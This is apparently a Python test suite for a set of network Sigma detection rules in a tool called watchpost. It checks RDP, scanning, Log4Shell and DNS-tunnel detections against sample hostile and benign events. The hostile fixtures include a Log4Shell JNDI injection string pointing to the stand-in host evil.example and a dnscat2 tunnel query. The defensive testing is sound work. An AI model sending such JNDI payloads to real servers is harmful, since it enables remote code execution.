"""Network Sigma pack: each example loads, matches a hostile event, and stays quiet on a benign one."""

import unittest
from pathlib import Path

from watchpost import rules as rules_mod
from watchpost import sigma

PACK = Path(__file__).resolve().parent.parent / "docs" / "sigma-examples" / "network"

# filename -> (technique, rule id, events that must match, events that must not)
CASES = {
    "external_rdp_allowed.yml": (
        "T1133",
        "sigma_external_remote_desktop_session_allowed",
        [
            {"event_type": "fw_allow", "dest_port": 3389, "src_ip": "203.0.113.50", "dest_ip": "10.0.0.15",
             "message": "[UFW ALLOW] SRC=203.0.113.50 DST=10.0.0.15 DPT=3389"},
        ],
        [
            {"event_type": "fw_allow", "dest_port": 3389, "src_ip": "10.1.2.3", "dest_ip": "10.0.0.15",
             "message": "[UFW ALLOW] SRC=10.1.2.3 DST=10.0.0.15 DPT=3389"},
            {"event_type": "fw_allow", "dest_port": 3389, "src_ip": "172.16.4.4", "dest_ip": "10.0.0.15"},
            {"event_type": "fw_allow", "dest_port": 3389, "src_ip": "192.168.1.9", "dest_ip": "10.0.0.15"},
            {"event_type": "fw_allow", "dest_port": 3389, "src_ip": "127.0.0.1", "dest_ip": "10.0.0.15"},
            {"event_type": "fw_allow", "dest_port": 443, "src_ip": "203.0.113.50", "dest_ip": "10.0.0.15",
             "message": "[UFW ALLOW] SRC=203.0.113.50 DST=10.0.0.15 DPT=443"},
        ],
    ),
    "ip_block_scan.yml": (
        "T1595.001",
        "sigma_ip_block_scan_from_network_scanner",
        [
            {"event_type": "fw_deny", "src_ip": "198.51.100.10", "dest_ip": "10.0.0.10", "dest_port": 22,
             "message": "ET SCAN masscan User-Agent"},
            {"event_type": "network_connection", "src_ip": "198.51.100.10", "dest_ip": "10.0.0.0",
             "message": "Zeek notice Scan::Address_Scan"},
        ],
        [
            {"event_type": "fw_deny", "src_ip": "198.51.100.10", "dest_ip": "10.0.0.10", "dest_port": 22,
             "message": "[UFW BLOCK] blocked inbound probe DPT=22"},
            {"event_type": "web_request", "message": "GET /docs/masscan -> 200 ua=Mozilla/5.0"},
        ],
    ),
    "vulnerability_scanner_web.yml": (
        "T1595.002",
        "sigma_vulnerability_scanner_against_a_web_service",
        [
            {"event_type": "web_scan", "src_ip": "203.0.113.80",
             "message": "GET /.env -> 404 ua=Mozilla/5.00 (Nikto/2.5.0)"},
            {"event_type": "web_request", "src_ip": "203.0.113.81",
             "message": "GET / -> 200 ua=Mozilla/4.0 (compatible; Nessus)"},
        ],
        [
            {"event_type": "web_request", "src_ip": "10.0.1.20",
             "message": "GET /app/dashboard -> 200 ua=Mozilla/5.0 (X11; Linux x86_64)"},
            {"event_type": "web_request", "src_ip": "10.0.1.20",
             "message": "GET /search?q=nucleic+acid -> 200 ua=Mozilla/5.0"},
        ],
    ),
    "network_service_discovery.yml": (
        "T1046",
        "sigma_network_service_discovery_sweep",
        [
            {"event_type": "network_connection", "src_ip": "10.0.5.20", "dest_ip": "10.0.0.15", "dest_port": 445,
             "message": "CrackMapExec smb 10.0.0.15"},
            {"event_type": "fw_deny", "src_ip": "10.0.5.20", "dest_ip": "10.0.0.15", "dest_port": 445,
             "message": "Zeek notice Scan::Port_Scan"},
        ],
        [
            {"event_type": "network_connection", "src_ip": "10.0.5.20", "dest_ip": "10.0.0.15", "dest_port": 445,
             "message": "SMB session to fileserver"},
            {"event_type": "web_request", "message": "GET /blog/crackmapexec-notes -> 200 ua=Mozilla/5.0"},
        ],
    ),
    "log4shell_jndi_probe.yml": (
        "T1190",
        "sigma_log_shell_jndi_exploit_probe",
        [
            {"event_type": "web_scan", "src_ip": "203.0.113.9",
             "message": "GET /${jndi:ldap://evil.example/a} -> 404"},
            {"event_type": "web_request", "src_ip": "203.0.113.9",
             "message": "GET /%24%7bjndi:ldap://evil.example/a -> 400"},
        ],
        [
            {"event_type": "web_request", "src_ip": "10.0.1.20",
             "message": "GET /search?q=log4j -> 200 ua=Mozilla/5.0"},
            {"event_type": "web_scan", "src_ip": "203.0.113.80",
             "message": "GET /.env -> 404 ua=Mozilla/5.00 (Nikto/2.5.0)"},
        ],
    ),
    "dns_tunnel_tool.yml": (
        "T1048",
        "sigma_dns_tunnel_tool_on_port",
        [
            {"event_type": "network_connection", "src_ip": "10.0.8.8", "dest_ip": "203.0.113.53", "dest_port": 53,
             "message": "DNS query suspected dnscat2 tunnel aGVsbG8.evil.example"},
            {"event_type": "fw_allow", "src_ip": "10.0.8.8", "dest_ip": "203.0.113.53", "dest_port": 53,
             "message": "[UFW ALLOW] DPT=53 dns2tcp client"},
        ],
        [
            {"event_type": "network_connection", "src_ip": "10.0.8.8", "dest_ip": "10.0.0.53", "dest_port": 53,
             "message": "DNS query example.com A"},
            {"event_type": "network_connection", "src_ip": "10.0.8.8", "dest_ip": "203.0.113.53", "dest_port": 53,
             "message": "DNS query iodine.com A"},
            {"event_type": "network_connection", "src_ip": "10.0.8.8", "dest_port": 443,
             "message": "TLS SNI blog.example discussed dnscat2"},
        ],
    ),
}


class NetworkSigmaPackTests(unittest.TestCase):
    def test_pack_is_the_six_rules(self):
        files = sorted(p.name for p in PACK.glob("*.yml"))
        self.assertEqual(files, sorted(CASES))

    def test_each_rule_loads_matches_and_ignores_benign(self):
        seen = set()
        for name, (technique, rule_id, malicious, benign) in CASES.items():
            with self.subTest(rule=name):
                compiled = sigma.compile_rule((PACK / name).read_text(encoding="utf-8"))
                self.assertEqual(compiled["rule_id"], rule_id)
                self.assertNotIn(rule_id, seen)
                self.assertNotIn(rule_id, rules_mod.RULE_FUNCTIONS)
                seen.add(rule_id)
                self.assertEqual([t["id"] for t in compiled["techniques"]], [technique])
                for event in malicious:
                    self.assertTrue(sigma.matches(compiled["params"], event), event)
                for event in benign:
                    self.assertFalse(sigma.matches(compiled["params"], event), event)
